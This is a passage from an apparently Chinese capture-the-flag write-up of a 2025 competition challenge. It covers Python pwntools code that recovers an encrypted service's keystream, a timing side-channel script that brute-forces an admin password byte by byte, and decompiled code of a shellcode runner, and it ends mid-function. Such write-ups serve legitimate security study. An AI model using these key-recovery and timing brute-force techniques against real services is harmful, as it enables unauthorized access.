步骤2: 从 u 恢复 v7</span></span><br><span class="line">    u_high = (u &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    u_low = u &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v7_high = u_high</span><br><span class="line">    v7_low = u_low ^ u_high</span><br><span class="line">    v7 = (v7_high &lt;&lt; <span class="number">32</span>) | v7_low</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤3-7: 逐步逆异或变换恢复 v6</span></span><br><span class="line">    x4 = inverse_xor_shift(v7, <span class="number">16</span>)</span><br><span class="line">    x3 = inverse_xor_shift(x4, <span class="number">8</span>)</span><br><span class="line">    x2 = inverse_xor_shift(x3, <span class="number">4</span>)</span><br><span class="line">    x1 = inverse_xor_shift(x2, <span class="number">2</span>)</span><br><span class="line">    x0 = inverse_xor_shift(x1, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OOO = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D</span></span><br><span class="line"><span class="string">3D 20 54 4F 59 20 45 4E 43 52 59 50 54 45 44 20</span></span><br><span class="line"><span class="string">53 45 52 56 49 43 45 20 3D 3D 3D 3D 3D 3D 3D 3D</span></span><br><span class="line"><span class="string">3D 3D 3D 3D 3D 3D 3D 3D 3D 0A 31 29 20 45 63 68</span></span><br><span class="line"><span class="string">6F 20 62 61 63 6B 20 77 68 61 74 20 79 6F 75 20</span></span><br><span class="line"><span class="string">73 65 6E 64 0A 32 29 20 41 64 6D 69 6E 20 6C 6F</span></span><br><span class="line"><span class="string">67 69 6E 0A 33 29 20 4D 61 67 69 63 43 6F 64 65</span></span><br><span class="line"><span class="string">20 72 75 6E 6E 65 72 0A 34 29 20 53 68 6F 77 20</span></span><br><span class="line"><span class="string">63 6F 6E 66 69 67 0A 35 29 20 51 75 69 74 0A 0A</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 0A 59 6F 75 72 20 63</span></span><br><span class="line"><span class="string">68 6F 69 63 65 3A 20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setKey</span>(<span class="params">hexdata</span>):</span><br><span class="line">    data = <span class="built_in">bytes</span>.fromhex(hexdata.decode())</span><br><span class="line">    <span class="keyword">global</span> KEYA, KEYB, KEYC, KEYX</span><br><span class="line">    kc = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    kb = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    ka = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xC0</span> // <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">4</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">        num1 = u64(data[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        num2 = u64(OOO[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        KEYX.append(num1 ^ num2)</span><br><span class="line">        KEYC_TMP.append(inverse_mix(num1 ^ num2))</span><br><span class="line">        <span class="comment"># print(hex(KEYX[i]),hex(KEYC[i]))</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">8</span>):</span><br><span class="line">        num1 = u64(data[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        num2 = u64(OOO[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">5</span> <span class="keyword">or</span> i == <span class="number">7</span>:</span><br><span class="line">            KEYB[i &amp; <span class="number">3</span>] = KEYC_TMP[i]</span><br><span class="line">            <span class="comment"># print(hex(KEYB[i &amp; 3]))</span></span><br><span class="line">    k1 = [KEYC_TMP[<span class="number">0</span>], KEYC_TMP[<span class="number">4</span>], KEYC_TMP[<span class="number">8</span>], KEYC_TMP[<span class="number">12</span>]]</span><br><span class="line">    k2 = [KEYC_TMP[<span class="number">1</span>], KEYC_TMP[<span class="number">5</span>], KEYC_TMP[<span class="number">9</span>], KEYC_TMP[<span class="number">13</span>]]</span><br><span class="line">    k3 = [KEYC_TMP[<span class="number">2</span>], KEYC_TMP[<span class="number">6</span>], KEYC_TMP[<span class="number">10</span>], KEYC_TMP[<span class="number">14</span>]]</span><br><span class="line">    k4 = [KEYC_TMP[<span class="number">3</span>], KEYC_TMP[<span class="number">7</span>], KEYC_TMP[<span class="number">11</span>], KEYC_TMP[<span class="number">15</span>]]</span><br><span class="line">    res1 = find_k_b_from_sequence(k1)</span><br><span class="line">    res2 = find_k_b_from_sequence(k2)</span><br><span class="line">    res3 = find_k_b_from_sequence(k3)</span><br><span class="line">    res4 = find_k_b_from_sequence(k4)</span><br><span class="line">    <span class="built_in">print</span>(res1)</span><br><span class="line">    <span class="built_in">print</span>(res2)</span><br><span class="line">    <span class="built_in">print</span>(res3)</span><br><span class="line">    <span class="built_in">print</span>(res4)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(res1) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(res2) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(res3) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(res4) == <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>==<span class="number">1</span>:</span><br><span class="line">        KEYA[<span class="number">0</span>] = res1[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYA[<span class="number">1</span>] = res2[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYA[<span class="number">2</span>] = res3[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYA[<span class="number">3</span>] = res4[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYB[<span class="number">0</span>] = res1[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        KEYB[<span class="number">1</span>] = res2[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        KEYB[<span class="number">2</span>] = res3[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        KEYB[<span class="number">3</span>] = res4[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;KEYA:&quot;</span>, [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> KEYA])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;KEYB:&quot;</span>, [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> KEYB])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getKeyStream</span>():</span><br><span class="line">    <span class="keyword">global</span> KEYA, KEYB, KEYC, KEYX</span><br><span class="line">    KEYX = [i <span class="keyword">for</span> i <span class="keyword">in</span> KEYC]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        realkey = mix(KEYX[i &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="keyword">yield</span> realkey.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        KEYX[i &amp; <span class="number">3</span>] = (KEYB[i &amp; <span class="number">3</span>] + KEYA[i &amp; <span class="number">3</span>] * KEYX[i &amp; <span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEYGEN = getKeyStream()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">hexdata</span>):</span><br><span class="line">    KEY = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    data = <span class="built_in">bytes</span>.fromhex(hexdata.decode())</span><br><span class="line">    dec = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            KEY = <span class="built_in">next</span>(KEYGEN)</span><br><span class="line">        dec[i] ^= KEY[i % <span class="built_in">len</span>(KEY)]</span><br><span class="line">    <span class="comment"># print(dec.hex())</span></span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    KEY = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    enc = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            KEY = <span class="built_in">next</span>(KEYGEN)</span><br><span class="line">        enc[i] ^= KEY[i % <span class="built_in">len</span>(KEY)]</span><br><span class="line">    <span class="comment"># print(dec)</span></span><br><span class="line">    <span class="keyword">return</span> enc.<span class="built_in">hex</span>().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    KEYA = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    KEYB = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    KEYC_TMP = []  <span class="comment"># [0x9E3779B97F4A7C15, 0x0000000000000000, 0x94D049BB133111EB, 0x0000000000000000]</span></span><br><span class="line">    KEYC = [<span class="number">0x9E3779B97F4A7C15</span>, <span class="number">0x0000000000000000</span>, <span class="number">0x94D049BB133111EB</span>, <span class="number">0x0000000000000000</span>]</span><br><span class="line">    KEYX = []</span><br><span class="line"></span><br><span class="line">    r = process(<span class="string">&quot;./somebox&quot;</span>)</span><br><span class="line">    firstData = r.recvline()</span><br><span class="line">    setKey(firstData)</span><br><span class="line">    <span class="keyword">if</span> (KEYA[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        r.close()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    decrypt(firstData)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        inp = <span class="built_in">input</span>(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> inp == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            r.sendline(encrypt(inp.encode()))</span><br><span class="line">            b = r.recvline()</span><br><span class="line">            <span class="built_in">print</span>(decrypt(b).decode())</span><br></pre></td></tr></table></figure>

<p>这样就可以成功和这个系统交互了，注意功能 1 并没有加密，而是直接输出，所以密钥不能轮转，事实上 1 功能在比赛中是用不到的功能。</p>
<img src="/2025/11/26/qwb2025_final/8.png" class="">

<p>分析登录功能，同样顺着字符串找关键位置，但是因为选手不可能手动和这个 ELF 交互，必须用 pwntools，所以需要借助 <code>dbg_server</code> 的附加功能完成调试，操作步骤为：</p>
<ul>
<li>开启 <code>dbg_server</code></li>
<li>在对应机器上使用 <code>pwntools</code> 运行程序。</li>
<li>ida 选择进程附加</li>
</ul>
<p>附截图，开启server，运行 <code>exp</code></p>
<img src="/2025/11/26/qwb2025_final/9.png" class="">

<p>调试选项选附加</p>
<img src="/2025/11/26/qwb2025_final/10.png" class="">

<p>选择对应的进程</p>
<img src="/2025/11/26/qwb2025_final/11.png" class="">

<p>然后就可以美美调试了。</p>
<img src="/2025/11/26/qwb2025_final/12.png" class="">

<p>根据逻辑可知，用户名必须为 <code>admin</code>，<code>password</code> 经过调试是随机生成的。</p>
<img src="/2025/11/26/qwb2025_final/13.png" class="">

<p>每次判断密码正确会 <code>sleep 5ms</code>，根据这个特性可以逐字节爆破。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brutePassword</span>():</span><br><span class="line">    password = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    current = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">0x7F</span>):</span><br><span class="line">            password[current] = c</span><br><span class="line">            r.sendline(encrypt(<span class="string">b&#x27;2&#x27;</span>).encode())</span><br><span class="line">            decrypt(r.recvline()).decode()</span><br><span class="line">            r.sendline(encrypt(<span class="string">b&#x27;admin&#x27;</span>).encode())</span><br><span class="line">            decrypt(r.recvline()).decode() <span class="comment"># enter password</span></span><br><span class="line">            r.sendline(encrypt(password.strip(<span class="string">b&#x27;\x00&#x27;</span>)).encode())</span><br><span class="line">            result = decrypt(r.recvline()).decode()</span><br><span class="line">            pos = result.find(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            rpos = result.find(<span class="string">&#x27;ms)&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span>(rpos == -<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;!!!&quot;</span>,password.strip(<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> password.strip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            T = <span class="built_in">int</span>(result[pos+<span class="number">1</span>:rpos])</span><br><span class="line">            <span class="keyword">if</span>(T &gt;= <span class="number">5</span>*current +<span class="number">5</span>):</span><br><span class="line">                <span class="built_in">print</span>(password.strip(<span class="string">b&#x27;\x00&#x27;</span>),result,T)</span><br><span class="line">                current += <span class="number">1</span></span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span>(found):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> found):</span><br><span class="line">            password[current] = <span class="number">0</span></span><br><span class="line">            current -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure>

<p>为了本地调试方便，把密码 patch 了，让它永远返回正确，因为后面才是大头。</p>
<img src="/2025/11/26/qwb2025_final/14.png" class="">

<p>简单粗暴点就行。</p>
<p>根据功能 3 找到具体执行的位置。</p>
<img src="/2025/11/26/qwb2025_final/15.png" class="">

<p>这里可以看到用 <code>mmap</code> 分配了权限为 7 的内存段。</p>
<img src="/2025/11/26/qwb2025_final/16.png" class="">

<p>它在执行之前会把可写权限关闭，并且满足一定的条件下会随机打乱输入的 shellcode。</p>
<p>全部算法如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_56F17A9626C0</span><span class="params">(<span class="type">void</span> *src, <span class="type">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE *v2; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">    _BYTE *v4; <span class="comment">// r14</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">    __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">int</span> b1; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">unsigned</span> __int16 b2; <span class="comment">// cx</span></span><br><span class="line">    <span class="type">int</span> b3; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// r14d</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// bl</span></span><br><span class="line">    <span class="type">char</span> i; <span class="comment">// bp</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *v13; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">bool</span> v16; <span class="comment">// cf</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// r14d</span></span><br><span class="line">    __int64 v18; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">size_t</span> v19; <span class="comment">// r13</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v21; <span class="comment">// [rsp+Ch] [rbp-8Ch] BYREF</span></span><br><span class="line">    <span class="type">void</span> *v22; <span class="comment">// [rsp+10h] [rbp-88h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v23; <span class="comment">// [rsp+18h] [rbp-80h]</span></span><br><span class="line">    _DWORD v24[<span class="number">2</span>]; <span class="comment">// [rsp+1Ch] [rbp-7Ch] BYREF</span></span><br><span class="line">    _BYTE v25[<span class="number">4</span>]; <span class="comment">// [rsp+24h] [rbp-74h]</span></span><br><span class="line">    <span class="type">int</span> v26; <span class="comment">// [rsp+28h] [rbp-70h]</span></span><br><span class="line">    <span class="type">int</span> v27; <span class="comment">// [rsp+2Ch] [rbp-6Ch]</span></span><br><span class="line">    <span class="type">char</span> v28; <span class="comment">// [rsp+30h] [rbp-68h]</span></span><br><span class="line">    <span class="type">int</span> v29; <span class="comment">// [rsp+34h] [rbp-64h]</span></span><br><span class="line">    <span class="type">int</span> v30; <span class="comment">// [rsp+38h] [rbp-60h]</span></span><br><span class="line">    <span class="type">char</span> v31; <span class="comment">// [rsp+3Ch] [rbp-5Ch]</span></span><br><span class="line">    <span class="type">size_t</span> v32; <span class="comment">// [rsp+40h] [rbp-58h]</span></span><br><span class="line">    _BYTE *v33; <span class="comment">// [rsp+48h] [rbp-50h]</span></span><br><span class="line">    <span class="type">size_t</span> v34; <span class="comment">// [rsp+50h] [rbp-48h]</span></span><br><span class="line">    __int64 v35; <span class="comment">// [rsp+58h] [rbp-40h]</span></span><br><span class="line">    __int64 v36; <span class="comment">// [rsp+60h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">getrandom</span>(&amp;v22, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    v22 = (<span class="type">void</span> *)((_QWORD)v22 &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    v2 = <span class="built_in">mmap</span>(v22, <span class="number">0x1000u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == (_BYTE *)<span class="number">-1LL</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)v2;</span><br><span class="line">    v3 = <span class="number">2048</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">0x800</span> )</span><br><span class="line">        v3 = n;</span><br><span class="line">    <span class="keyword">if</span> ( !n )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)v2;</span><br><span class="line">    v4 = v2;</span><br><span class="line">    <span class="built_in">memcpy</span>(v2, src, v3);</span><br><span class="line">    v32 = v3;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v4[v3], <span class="number">0</span>, <span class="number">4096</span> - v3);</span><br><span class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    v34 = v32 - <span class="number">3</span>;</span><br><span class="line">    v5 = *v4;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v33 = v4;</span><br><span class="line">    LABEL_8:</span><br><span class="line">    v36 = v6 + <span class="number">1</span>;</span><br><span class="line">    b1 = (<span class="type">char</span>)v4[v6 + <span class="number">1</span>];</span><br><span class="line">    v35 = v6;</span><br><span class="line">    b2 = (<span class="type">char</span>)v4[v6 + <span class="number">2</span>];</span><br><span class="line">    b3 = (<span class="type">unsigned</span> __int16)v5;</span><br><span class="line">    v23 = b1;</span><br><span class="line">    v24[<span class="number">0</span>] = b3 + <span class="number">255</span>;</span><br><span class="line">    v24[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">    v25[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v26 = (<span class="type">unsigned</span> __int16)b1 + <span class="number">255</span>;</span><br><span class="line">    v27 = <span class="number">5</span>;</span><br><span class="line">    v28 = <span class="number">1</span>;</span><br><span class="line">    v29 = b2 + <span class="number">255</span>;</span><br><span class="line">    v30 = <span class="number">5</span>;</span><br><span class="line">    v31 = <span class="number">1</span>;</span><br><span class="line">    v10 = b2 + (<span class="type">unsigned</span> __int16)b1 + b3 + <span class="number">510</span> + <span class="number">255</span>;</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; ; i = <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v21 = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">getrandom</span>(&amp;v21, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v25[<span class="number">12</span> * (v21 % <span class="number">3</span>)] )</span><br><span class="line">            &#123;</span><br><span class="line">                v14 = v10;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">            &#125;</span><br><span class="line">            v13 = &amp;v24[<span class="number">3</span> * (v21 % <span class="number">3</span>)];</span><br><span class="line">            v14 = <span class="number">0</span>;</span><br><span class="line">            v15 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( *v13 &gt;= <span class="number">5</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            *v13 = <span class="number">0</span>;</span><br><span class="line">            v16 = v10 &lt; v13[<span class="number">1</span>];</span><br><span class="line">            v17 = v10 - v13[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            LABEL_19:</span><br><span class="line">            v14 = v17;</span><br><span class="line">            <span class="keyword">if</span> ( v15 &lt; <span class="number">5</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">            LABEL_15:</span><br><span class="line">            <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            LABEL_9:</span><br><span class="line">            <span class="keyword">if</span> ( v14 &lt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                LABEL_7:</span><br><span class="line">                v4 = v33;</span><br><span class="line">                v5 = v23;</span><br><span class="line">                v6 = v36;</span><br><span class="line">                <span class="keyword">if</span> ( v35 == v34 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">            &#125;</span><br><span class="line">            LABEL_10:</span><br><span class="line">            v10 = v14;</span><br><span class="line">        &#125;</span><br><span class="line">        v15 = *v13 - <span class="number">5</span>;</span><br><span class="line">        *v13 = v15;</span><br><span class="line">        v16 = v10 &lt; v13[<span class="number">1</span>];</span><br><span class="line">        v17 = v10 - v13[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !v16 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">        LABEL_14:</span><br><span class="line">        <span class="keyword">if</span> ( v15 &gt;= <span class="number">5</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        LABEL_20:</span><br><span class="line">        *((_BYTE *)v13 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">        i = v25[<span class="number">0</span>];</span><br><span class="line">        v11 = v28;</span><br><span class="line">        <span class="keyword">if</span> ( (v25[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> 